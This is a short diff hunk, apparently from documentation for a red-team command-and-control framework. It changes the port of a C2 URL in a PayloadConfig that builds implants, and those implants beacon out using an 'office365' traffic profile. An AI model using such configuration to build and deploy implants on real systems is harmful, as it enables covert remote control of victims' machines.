@@ -17,7 +17,7 @@ for use with the payload builder so implants beacon to the correct paths:
 
     profile = get_profile("office365")
     cfg = PayloadConfig(
-        c2_url="http://10.0.0.1:8443",
+        c2_url="http://10.0.0.1:6708",
         template="http_python",
         extra_tokens=profile.builder_tokens(),
     )
